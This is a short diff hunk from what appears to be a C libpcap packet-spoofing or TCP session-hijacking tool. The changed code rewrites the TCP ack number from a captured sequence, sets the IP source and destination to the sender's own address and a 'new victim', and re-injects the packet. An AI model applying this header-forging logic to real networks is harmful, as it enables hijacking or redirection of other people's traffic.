@@ -392,17 +392,16 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 		if (receivedResponse == 1)
 		{
 			printf("\t\t\treceived response entered\n");
-			//memcpy(&tcpHeader->th_seq, &response_seq, sizeof(tcpHeader->th_seq));
-			printf("\t\t\tseq before inc: %u\n", htonl(response_seq));
-			//response_seq++;
 			temp = (htonl(response_seq) + 1);
 			response_seq = ntohl(temp);
-			printf("\t\t\tseq after inc: %u\n", (htonl(response_seq)));
-			tcpHeader->th_ack = response_seq;
-			//memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
+			memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
 		}
 		printf("\t\t\tmod seq = %u\n", htonl(tcpHeader->th_seq));
 		printf("\t\t\tmod ack = %u\n", htonl(tcpHeader->th_ack));
+
+		memcpy(&ipHeader->ip_src, &struct_my_ip.addr_ip, IP_ADDR_LEN);
+		memcpy(&ipHeader->ip_dst, &struct_ip_new_victim.addr_ip, IP_ADDR_LEN);
+
 		receivedResponse = 0;
 		n = pcap_sendpacket(handle, packet, packet_header->len);
 		if (n != 0)
